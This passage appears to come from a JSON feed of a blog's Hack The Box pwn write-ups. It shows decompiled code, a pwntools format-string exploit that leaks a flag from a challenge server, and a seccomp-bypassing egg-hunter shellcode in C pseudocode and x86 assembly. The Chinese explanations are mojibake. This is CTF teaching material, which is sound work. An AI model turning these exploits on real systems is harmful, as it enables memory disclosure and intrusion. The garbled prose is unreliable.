class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int car_menu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int v0; // eax</span><br><span class=\"line\">  size_t i; // eax</span><br><span class=\"line\">  size_t v2; // edx</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  int v4; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v5; // [esp+0h] [ebp-58h]</span><br><span class=\"line\">  int v6; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  int v7; // [esp+4h] [ebp-54h]</span><br><span class=\"line\">  unsigned int v8; // [esp+8h] [ebp-50h]</span><br><span class=\"line\">  int v9; // [esp+Ch] [ebp-4Ch]</span><br><span class=\"line\">  int v10; // [esp+10h] [ebp-48h]</span><br><span class=\"line\">  void *buf; // [esp+18h] [ebp-40h]</span><br><span class=\"line\">  FILE *stream; // [esp+1Ch] [ebp-3Ch]</span><br><span class=\"line\">  char v13[44]; // [esp+20h] [ebp-38h] BYREF</span><br><span class=\"line\">  unsigned int v14; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  v14 = __readgsdword(0x14u);</span><br><span class=\"line\">  v4 = -1;</span><br><span class=\"line\">  v6 = -1;</span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(aSelectCar1);</span><br><span class=\"line\">    v9 = read_int(v4, v6);</span><br><span class=\"line\">    if ( v9 != 2 &amp;&amp; v9 != 1 )</span><br><span class=\"line\">      printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v9 != 2 &amp;&amp; v9 != 1 );</span><br><span class=\"line\">  v10 = race_type();</span><br><span class=\"line\">  v0 = time(0);</span><br><span class=\"line\">  srand(v0);</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; v10 == 2 || v9 == 2 &amp;&amp; v10 == 2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 10;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; v10 == 1 || v9 == 2 &amp;&amp; v10 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 10;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = rand() % 100;</span><br><span class=\"line\">    v7 = rand() % 100;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  for ( i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;); ; i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = i;</span><br><span class=\"line\">    result = v8;</span><br><span class=\"line\">    if ( v2 &lt;= v8 )</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    putchar(aWaitingForTheR[v8]);</span><br><span class=\"line\">    if ( aWaitingForTheR[v8] == 46 )</span><br><span class=\"line\">      sleep(0);</span><br><span class=\"line\">    ++v8;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[+] You won the race!! You get 100 coins!\\n&quot;, &quot;\\x1B[1;32m&quot;);</span><br><span class=\"line\">    coins += 100;</span><br><span class=\"line\">    printf(&quot;[+] Current coins: [%d]%s\\n&quot;, coins, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">    printf(&quot;\\n[!] Do you have anything to say to the press after your big victory?\\n&gt; %s&quot;, &quot;\\x1B[0m&quot;);</span><br><span class=\"line\">    buf = malloc(0x171u);</span><br><span class=\"line\">    stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">    if ( !stream )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printf(&quot;%s[-] Could not open flag.txt. Please contact the creator.\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">      exit(105);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fgets(v13, 44, stream);</span><br><span class=\"line\">    read(0, buf, 0x170u);</span><br><span class=\"line\">    puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">    return printf((const char *)buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else if ( v9 == 1 &amp;&amp; (result = v5, v5 &gt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &lt; v7) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;%s\\n\\n[-] You lost the race and all your coins!\\n&quot;, &quot;\\x1B[1;31m&quot;);</span><br><span class=\"line\">    coins = 0;</span><br><span class=\"line\">    return printf(&quot;[+] Current coins: [%d]%s\\n&quot;, 0, &quot;\\x1B[1;36m&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>é‡Œé¢è°ƒç”¨äº†ä¸€ä¸ª fopen æ‰“å¼€äº†ä¸€ä¸ª flag.txt æˆ‘ä»¬ç›®æ ‡å‡ºç°äº†</p>\n<p>åˆ†æä¸€ä¸‹è¿™ä¸ªä»£ç </p>\n<p>ä¸€å¼€å§‹èµ‹å€¼ç»™ v4 ä»¥åŠ v6 ä¸º - 1 ä½¿ç”¨äº†ä¸€ä¸ª</p>\n<p>do while å¾ªç¯åˆ¤æ–­æ˜¯å¦ä¸º 1 æˆ– 2ï¼Œå¦‚æœä¸ºå…¶ä»–æ•°çš„è¯å°±æ‰“å°</p>\n<p>[-] Invalid choice!</p>\n<p>ç„¶åè°ƒç”¨ race_type () å…¶å®ä¹Ÿæ˜¯ä¸€æ ·</p>\n<p>ç„¶åè®¾ç½® srand (time (0))</p>\n<p>if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) )</p>\n<p>è¿™ä¸ªåˆ¤æ–­çš„è¯å°±æ˜¯ä½ è¦ä¹ˆè¾“å…¥ 2 ä¸ç„¶å°±ä¸ºå‡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fgets(v13, 44, stream);</span><br><span class=\"line\">read(0, buf, 0x170u);</span><br><span class=\"line\">puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);</span><br><span class=\"line\">return printf((const char *)buf);</span><br></pre></td></tr></table></figure></p>\n<p>ç°åœ¨å¯ä»¥åˆ©ç”¨çš„ç‚¹å°±è¯´è¿™ä¸ª printf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡º</p>\n<p>é‚£æˆ‘ä»¬åˆ©ç”¨è„šæœ¬æ¥è¾“å‡ºçœ‹çœ‹</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"> </span><br><span class=\"line\">offset_start_flag = 12</span><br><span class=\"line\">len_of_flag = 44</span><br><span class=\"line\">offset_end_flag = offset_start_flag + 11</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">formatstring = &quot;&quot;</span><br><span class=\"line\"> </span><br><span class=\"line\">for i in range(offset_start_flag, offset_end_flag):</span><br><span class=\"line\">    formatstring += &quot;%&quot;+str(i)+&quot;$p &quot;</span><br><span class=\"line\">print(formatstring) </span><br><span class=\"line\"> </span><br><span class=\"line\">r = remote(&quot;167.99.82.136&quot;,30709)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;Name: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;Nickname: &quot;, &quot;a&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)</span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">r.sendlineafter(&quot;&gt; &quot;, formatstring)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">response = r.recv()</span><br><span class=\"line\"> </span><br><span class=\"line\"># Format output</span><br><span class=\"line\">preflag = (response.decode(&quot;utf-8&quot;).split(&quot;m\\n&quot;))[1]</span><br><span class=\"line\">preflag = preflag.split()</span><br><span class=\"line\"> </span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\">for hexdecimal in preflag:</span><br><span class=\"line\">    flag += p32(int(hexdecimal, base=16)).decode(&quot;utf-8&quot;)</span><br><span class=\"line\"> </span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-hunting-md/",
            "url": "https://lookhui.github.io/HTB-hunting-md/",
            "title": "HTB-hunting",
            "date_published": "2023-12-13T07:18:01.000Z",
            "content_html": "<h1 id=\"htb-hunting\"><a class=\"anchor\" href=\"#htb-hunting\">#</a> HTB-hunting</h1>\n<p>è¿™æ˜¯ä¸€é“æ‰‹å†™ shellcode é¢˜ç›®</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>å¼€å¯äº† PIE åœ°å€éšæœºåŒ–</p>\n<p>ä½¿ç”¨ strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdH</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">strcpy</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">perror</span><br><span class=\"line\">signal</span><br><span class=\"line\">mmap</span><br><span class=\"line\">prctl</span><br><span class=\"line\">memset</span><br><span class=\"line\">read</span><br><span class=\"line\">alarm</span><br><span class=\"line\">close</span><br><span class=\"line\">open</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">prctl(PR_SET_NO_NEW_PRIVS)</span><br><span class=\"line\">prctl(PR_SET_SECCOMP)</span><br><span class=\"line\">/dev/urandom</span><br><span class=\"line\">9*2$&quot;</span><br><span class=\"line\">HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;</span><br><span class=\"line\">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.gnu.property</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.plt.got</span><br><span class=\"line\">.plt.sec</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>å¯ä»¥çœ‹åˆ°é‡Œé¢æ˜¯æœ‰ä¸ª HTB {xxx} çš„ä¿¡æ¯</p>\n<p>./hunting è¿è¡Œå°è¯•</p>\n<p>å‘ç°æ— è®ºè¾“å…¥ä»»ä½•æ•°éƒ½æ˜¾ç¤º</p>\n<p>Segmentation fault</p>\n<p>æ‹–å…¥ ida32 æŸ¥çœ‹</p>\n<p>æ²¡æœ‰æ˜¾ç¤º main å‡½æ•°ï¼Œåªæœ‰è‡ªå·±æ‰¾ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç å¯ä»¥åˆ¤æ–­ä¸ºä¸»å‡½æ•°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_1460()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v1; // [esp-10h] [ebp-24h]</span><br><span class=\"line\">  int v2; // [esp-Ch] [ebp-20h]</span><br><span class=\"line\">  int v3; // [esp-8h] [ebp-1Ch]</span><br><span class=\"line\">  int v4; // [esp-4h] [ebp-18h]</span><br><span class=\"line\">  void *buf; // [esp+0h] [ebp-14h]</span><br><span class=\"line\">  char *dest; // [esp+4h] [ebp-10h]</span><br><span class=\"line\">  void *addr; // [esp+8h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  addr = (void *)sub_13D0();</span><br><span class=\"line\">  signal(14, (__sighandler_t)&amp;exit);</span><br><span class=\"line\">  alarm(0xAu);</span><br><span class=\"line\">  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);</span><br><span class=\"line\">  if ( dest == (char *)-1 )</span><br><span class=\"line\">    sub_1120(-1, v1, v2, v3);</span><br><span class=\"line\">  strcpy(dest, aHtbXxxxxxxxxxx);</span><br><span class=\"line\">  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));</span><br><span class=\"line\">  sub_133D();</span><br><span class=\"line\">  buf = mmap(0, 0x1000u, 7, 33, -1, 0);</span><br><span class=\"line\">  read(0, buf, 0x3Cu);</span><br><span class=\"line\">  ((void (__stdcall *)(int, void *, _DWORD))buf)(v4, buf, 0);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>è¿™ä¸ªä»£ç ä½¿ç”¨äº† mmap (addr, 0x1000u, 3, 49, -1, 0); è¯·æ±‚äº† 0x1000 å†…å­˜ç»™äº† dest ä»¥åŠ buf</p>\n<p>å¹¶ä¸”å°† strcpy (dest, aHtbXxxxxxxxxxx); æˆ‘ä»¬éœ€è¦çš„ flag æ‹·è´åˆ°äº† dest å†…å­˜ä¸­</p>\n<p>ç„¶ååœ¨ä½¿ç”¨äº† meset å‡½æ•°ç»™ flag ä¹‹å‰çš„å†…å­˜åœ°å€æ¸…é›¶</p>\n<p>read (0, buf, 0x3Cu); æˆ‘ä»¬ç°åœ¨è¿˜æœ‰ 0x3c çš„å†…å­˜å¯ä»¥åˆ©ç”¨</p>\n<p>è¿˜è°ƒç”¨äº† sub_13D0</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_13D0()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  unsigned int buf; // [esp+0h] [ebp-18h] BYREF</span><br><span class=\"line\">  int fd; // [esp+8h] [ebp-10h]</span><br><span class=\"line\">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class=\"line\">  read(fd, &amp;buf, 8u);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\">  srand(buf);</span><br><span class=\"line\">  for ( i = 0; i &lt;= 1610612735; i = rand() &lt;&lt; 16 )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  return i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>åˆ©ç”¨å†™å…¥çš„ buf å½“ä½œ srand å¹¶ä¸”åˆ©ç”¨ i æ¥æµ‹è¯•éšæœºæ•°</p>\n<p>åœ¨ä½¿ç”¨ seccomp-tools dump ./hunting</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">â””â”€# seccomp-tools dump ./hunting</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0013</span><br><span class=\"line\"> 0003: 0x15 0x09 0x00 0x0000000b  if (A == execve) goto 0013</span><br><span class=\"line\"> 0004: 0x15 0x08 0x00 0x00000166  if (A == execveat) goto 0013</span><br><span class=\"line\"> 0005: 0x15 0x07 0x00 0x00000127  if (A == openat) goto 0013</span><br><span class=\"line\"> 0006: 0x15 0x06 0x00 0x00000005  if (A == open) goto 0013</span><br><span class=\"line\"> 0007: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0013</span><br><span class=\"line\"> 0008: 0x15 0x04 0x00 0x00000008  if (A == creat) goto 0013</span><br><span class=\"line\"> 0009: 0x15 0x03 0x00 0x00000056  if (A == uselib) goto 0013</span><br><span class=\"line\"> 0010: 0x15 0x02 0x00 0x00000002  if (A == fork) goto 0013</span><br><span class=\"line\"> 0011: 0x15 0x01 0x00 0x000000be  if (A == vfork) goto 0013</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></p>\n<p>æŠŠ execve ä»¥åŠ openï¼Œclose ç»™ç¦ç”¨äº†ï¼Œè¡¨ç¤ºæˆ‘ä»¬æ— æ³•ä½¿ç”¨ getshellï¼Œorw</p>\n<p>è¿™ä¸ªæ—¶å€™å°±å¾—åˆ©ç”¨ c é‡Œé¢çš„å‡½æ•°å»æ‰¾ flag çš„åœ°å€äº†</p>\n<p>æ¯”å¦‚ access å¯ä»¥æ¥åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦å­˜åœ¨å¹¶ä¸”åˆ¤æ–­å†…å­˜åœ°å€æ˜¯å¦å­˜åœ¨</p>\n<p>åˆ©ç”¨è¯­æ³•ä¸º</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access(const char *filename,int mode);</span><br><span class=\"line\">å½“mode ä¸º0 æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ã€‚</span><br><span class=\"line\"></span><br><span class=\"line\">å½“mode ä¸º1æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ‰§è¡Œæƒé™ã€‚</span><br><span class=\"line\"></span><br><span class=\"line\">å½“mode ä¸º2æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰å†™æƒé™ã€‚</span><br><span class=\"line\"></span><br><span class=\"line\">å½“mode ä¸º3æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è¯»æƒé™ã€‚</span><br></pre></td></tr></table></figure></p>\n<p>filename å‚æ•°å¯ä»¥æ˜¯æ–‡ä»¶åä¹Ÿèƒ½æ˜¯å†…å­˜åœ°å€</p>\n<p>åˆ©ç”¨ access å‡½æ•°ä»¥ 0x1000 ä¸ºä¸€ä¸ªå•ä½æ¥æ…¢æ…¢éå†</p>\n<p>ç”¨ c ä¼ªä»£ç è¡¨è¾¾ä¸º</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (uint32_t address = 0x60000000; address &lt; 0x7fffffff; address += 0x1000)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        if (access(address + i +4) == EFAULT)</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        write(1, address, 0x26);</span><br><span class=\"line\">        exit(0);</span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>ä½¿ç”¨æ±‡ç¼–è¡¨è¾¾å°±æ˜¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov edx,0x5fffffff;</span><br><span class=\"line\">xor ecx,ecx;</span><br><span class=\"line\">notaccess:</span><br><span class=\"line\">or dx,0xfff;</span><br><span class=\"line\">inc edx;</span><br><span class=\"line\">mov eax,0x21;</span><br><span class=\"line\">lea  ebx,[edx+4]</span><br><span class=\"line\">int 0x80</span><br><span class=\"line\">cmp eax,0xfffffff2;</span><br><span class=\"line\">jz  notaccess;</span><br><span class=\"line\">mov eax,0x04;</span><br><span class=\"line\">mov ebx,1;</span><br><span class=\"line\">mov ecx,edx;</span><br><span class=\"line\">mov edx,0x26</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 